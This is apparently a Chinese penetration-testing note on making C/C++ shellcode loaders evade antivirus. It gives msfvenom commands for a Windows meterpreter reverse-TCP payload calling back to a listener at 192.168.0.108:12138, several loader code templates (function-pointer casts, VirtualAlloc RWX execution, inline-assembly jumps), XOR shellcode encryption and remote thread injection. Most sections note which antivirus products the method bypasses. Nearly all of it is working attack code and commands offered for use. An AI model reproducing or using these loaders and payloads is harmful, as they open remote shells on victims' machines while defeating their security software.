    #### c/c++源码免杀
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00' LHOST=192.168.0.108 LPORT=12138 -f c -o 1.c
	-i编码20次
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
  #### 指针执行
	unsigned char buf[] =
	"shellcode";
	#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口
	main()
	{
		( (void(*)(void))&buf)();
	}
	使用vc6.0组建编译后在靶机执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/50.png)

	当前过不了火绒，360动态静态可过
  #### 申请动态内存
	#include <Windows.h>
	#include <stdio.h>
	#include <string.h>
	#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口
	unsigned char buf[] =
	"shellcode";
	main()
	{
		char *Memory;
		Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(Memory, buf, sizeof(buf));
		((void(*)())Memory)();
	}
  #### 嵌入汇编
	#include <windows.h>
	#include <stdio.h>
	#pragma comment(linker, "/section:.data,RWE")
	unsigned char shellcode[] ="";
	void main()
	{
		__asm
		{
			mov eax, offset shellcode
			jmp eax
		}
	}
  #### 强制类型转换
	#include <windows.h>
	#include <stdio.h>
	unsigned char buf[] ="";
	void main()
	{
	 ((void(WINAPI*)(void))&buf)();
	}
  #### 汇编花指令
	#include <windows.h>
	#include <stdio.h>
	#pragma comment(linker, "/section:.data,RWE")
	unsigned char shellcode[] ="";
	void main()
	{
			__asm
		{
			mov eax, offset shellcode
			_emit 0xFF  
			_emit 0xE0
		}
	}
  #### XOR加密
	https://github.com/Arno0x/ShellcodeWrapper安装
	生成raw格式木马
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00' LHOST=192.168.0.108 LPORT=12138 -f raw -o shell.raw
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/51.png)

	加密
	> python shellcode_encoder.py -cpp -cs -py shell.raw thisiskey xor
	生成的py文件使用py2exe编译执行
	生成的cs文件使用csc.exe编译执行
	生成的cpp文件使用vc6.0编译，去掉预编译头编译执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/52.png)

  #### 远程线程注入
	目前过火绒，不过360，可组合一下
	Vs新建c++控制台程序
	右键属性-》将MFC的使用选为在静态库中使用MFC
	生成c格式shellcode粘贴进remote inject.cpp
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/53.png)

	生成项目
	能成功上线，并开启calc进程
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/54.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/55.png)